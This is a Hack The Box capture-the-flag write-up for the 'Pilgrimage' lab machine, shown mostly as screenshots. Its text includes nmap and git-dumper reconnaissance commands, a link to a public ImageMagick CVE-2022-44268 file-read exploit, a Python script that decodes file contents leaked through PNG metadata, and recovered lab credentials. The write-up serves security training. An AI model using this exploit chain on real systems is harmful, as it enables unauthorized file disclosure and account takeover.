# Pilgrimage - Writeup

**Date**: 03/09/2023

**Difficulty**: EASY

**CTF**: [https://app.hackthebox.com/machines/Pilgrimage](https://app.hackthebox.com/machines/Pilgrimage)


---



# Enumeration



`nmap -p- -sS --min-rate 5000 10.10.11.219 -n -Pn -vvv -oG allPorts`

![Untitled](img/Pasted%20image%2020230903133707.png)

`nmap -p22,80 -sCV 10.10.11.219 -oN targeted`

![Untitled](img/Pasted%20image%2020230903134027.png)

![Untitled](img/Pasted%20image%2020230903133850.png)

![Untitled](img/Pasted%20image%2020230903134113.png)

![Untitled](img/Pasted%20image%2020230903134202.png)

`git-dumper http://pilgrimage.htb/ git`

![Untitled](img/Pasted%20image%2020230903134416.png)

![Untitled](img/Pasted%20image%2020230903134454.png)

`whatweb http://pilgrimage.htb`

![Untitled](img/Pasted%20image%2020230903134516.png)



![Untitled](img/Pasted%20image%2020230903134559.png)

![Untitled](img/Pasted%20image%2020230903134620.png)

![Untitled](img/Pasted%20image%2020230903134639.png)

![Untitled](img/Pasted%20image%2020230903134654.png)

![Untitled](img/Pasted%20image%2020230903134739.png)

![Untitled](img/Pasted%20image%2020230903134801.png)

![Untitled](img/Pasted%20image%2020230903134912.png)

![Untitled](img/Pasted%20image%2020230903135239.png)

![Untitled](img/Pasted%20image%2020230903135302.png)

![Untitled](img/Pasted%20image%2020230903135323.png)

![Untitled](img/Pasted%20image%2020230903135358.png)

![Untitled](img/Pasted%20image%2020230903140444.png)

![Untitled](img/Pasted%20image%2020230903140539.png)

https://github.com/voidz0r/CVE-2022-44268

![Untitled](img/Pasted%20image%2020230903140758.png)![Untitled](img/Pasted image 20230903141324.png)

![Untitled](img/Pasted%20image%2020230903141356.png)

![Untitled](img/Pasted%20image%2020230903141510.png)

![Untitled](img/Pasted%20image%2020230903142037.png)

![Untitled](img/Pasted%20image%2020230903142818.png)

```python

import os



os.system("identify -verbose output.png | tail -n +98 | head -n -12 | tr -d '\n' > output.txt")

f=open("output.txt")

hex_string = f.read()

f.close()



print(bytes.fromhex(hex_string).decode("utf-8"))

```

![Untitled](img/Pasted%20image%2020230903145706.png)

![Untitled](img/Pasted%20image%2020230903145848.png)

![Untitled](img/Pasted%20image%2020230903154648.png)

`-emilyabigchonkyboi123`

`emily:abigchonkyboi123`

![Untitled](img/Pasted%20image%2020230903155352.png)

![Untitled](img/Pasted%20image%2020230903155432.png)



![Untitled](img/Pasted%20image%2020230903160621.png)

![Untitled](img/Pasted%20image%2020230903161321.png)

# Privesc

![Untitled](img/Pasted%20image%2020230903160823.png)



![Untitled](img/Pasted%20image%2020230903161601.png)

![Untitled](img/Pasted%20image%2020230903161623.png)



![Untitled](img/Pasted%20image%2020230903161849.png)

![Untitled](img/Pasted%20image%2020230903162502.png)

![Untitled](img/Pasted%20image%2020230903165519.png)

![Untitled](img/Pasted%20image%2020230903165655.png)

![Untitled](img/Pasted%20image%2020230903165540.png)

![Untitled](img/Pasted%20image%2020230903170935.png)

![Untitled](img/Pasted%20image%2020230903171008.png)

![Untitled](img/Pasted%20image%2020230903173112.png)

![Untitled](img/Pasted%20image%2020230903173149.png)





